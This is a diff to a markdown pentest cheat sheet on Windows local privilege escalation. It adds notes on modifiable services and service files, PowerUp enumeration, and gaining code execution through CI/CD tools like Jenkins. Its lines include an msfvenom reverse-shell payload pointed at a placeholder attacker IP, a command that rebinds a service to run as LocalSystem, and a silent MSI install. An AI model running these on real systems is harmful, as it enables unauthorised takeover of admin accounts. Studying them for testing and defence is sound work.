@@ -6,8 +6,9 @@ title: Windows local privilege-escalation
 - [2. Misconfigurations](#2-misconfigurations)
   - [2.1. Scheduled tasks](#21-scheduled-tasks)
   - [2.2. Services](#22-services)
-  - [2.3. AlwaysInstallElevated](#23-alwaysinstallelevated)
-  - [2.4. Users](#24-users)
+  - [2.3. Modifiable Service File](#23-modifiable-service-file)
+  - [2.4. AlwaysInstallElevated](#24-alwaysinstallelevated)
+  - [2.5. Users](#25-users)
 - [3. Credentials looting](#3-credentials-looting)
   - [3.1. Files](#31-files)
   - [3.2. Shell history](#32-shell-history)
@@ -20,6 +21,8 @@ title: Windows local privilege-escalation
 - [5. Bypassing UAC](#5-bypassing-uac)
   - [5.1. Auto-elevation](#51-auto-elevation)
   - [5.2. Scheduled tasks \& environment vars](#52-scheduled-tasks--environment-vars)
+- [6. Insecure Features](#6-insecure-features)
+  - [6.1. CI/CD software](#61-cicd-software)
 
 ## 1. Automatic tools
 
@@ -48,15 +51,15 @@ icacl <path>
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f exe-service -o my-service.exe
 ```
 
-#### 2.2.1. Executable permissions
+#### Executable permissions
 The executable associated with a service might have insecure permissions. The attacker modifing or replacing the executable can gain the privileges of the service's account.
 
 ```powershell
 icacls <executable-path>                    # Show DACL of the executable
 ```
 
-#### 2.2.2. Unquoted paths
-If the service's executable points to an unquoted path with spaces, SCM tries to execute firt binary which is the first part of the unqoted path. This SCM feature is basically disgusting but it works. It allows an attacker to put malicious service binary in the "wrong" path and run it before a legit one will be executed.
+#### Unquoted paths
+If the service's executable points to an unquoted path with spaces, SCM tries to execute firt binary which is the first part of the unqoted path. This SCM feature is basically disgusting but it works like that. It  allows an attacker to put malicious service binary in the "wrong" path and run it before a legit one will be executed.
 
 Example:
 
@@ -66,19 +69,37 @@ Executed 1st: C:\MyPrograms\Disk.exe
 Executed 2nd: C:\MyPrograms\Disk Sorter.exe
 ```
 
-#### 2.2.3. Service permissions
-The service DACL might allow to reconfigure service settings. This allows an attacker to point a malicious executable to the service and even change the account which the executable is run with.
+```powershell
+# PowerUp module
+Get-ServiceUnqoated -Verbose                # List unquoted paths           
+```
 
-To check a service DACL the [Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) tool might be necessary.
+> **NOTE**: To drop an executable in the root `C:\` directory you need to actually fhave admin privileges so the unquoted `C:\Program Files (x86)\...` is basically useless.
+
+#### Modifiable Service
+The service ACL might allow to reconfigure service settings. This allows an attacker to point a malicious executable to the service and even change the account which the executable is run with.
+
+To check a service ACL the [Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) tool might be necessary.
 
 ```powershell
-accesschk64.exe -qlc <svc-name>             # Check the service DACL
+accesschk64.exe -qlc <svc-name>             # Check the service ACL
 
 # Reconfigure service: run :exe-path with Local SYSTEM account
 sc.exe config <svc-name binPath= "<exe-path" obj= LocalSystem
+
+# PowerUp module
+Get-ModifiableService -Verbose              # List modifiable services
 ```
 
-### 2.3. AlwaysInstallElevated
+### 2.3. Modifiable Service File
+Sometimes it might be possible to modify binary which is run as a service.
+
+```powershell
+# PowerUp module
+Get-ModifiableServiceFile -Verbose          # List modifiable service files
+```
+
+### 2.4. AlwaysInstallElevated
 `.msi` files are used to install applications on the system. They usually run with the privileges of the current user but sometimes it might be configured to run installation files with higher privileges from any user account. Malicious `.msi` files can be generated using `msfvenom` tool.
 
 ```powershell
@@ -90,7 +111,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 msiexec /quiet /qn /i <path>
 ```
 
-### 2.4. Users
+### 2.5. Users
 Every user has some privileges and some of them might be used to perform privilege escalation:
 
 - [List of all possible privileges](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
@@ -307,3 +328,11 @@ Some executables can auto-elevate to high IL by default, without any user intera
 
 ### 5.2. Scheduled tasks & environment vars
 TBD
+
+## 6. Insecure Features
+There is various software that is insecure by design. Legit features of the software allow an attacker to escale privileges, e.g. by executing command as an administrator.
+
+### 6.1. CI/CD software
+Most of CI/CD software allows to execute some kind of scripts. Most often they work with escaled privileges (local Administrator or even SYSTEM). After successful login to such a software an attacker is able to execute a malicious code as an administator. Credentials usually are not hard to guess or bruteforce. Jenkins doesn't even have anti-brute-force mechanisms.
+
+> **NOTE**: Sometimes direct script execution is not allowed for you but at the same time you are allowed to add an extra deployment step which executes Windows commands. The result will be the same - command execution.
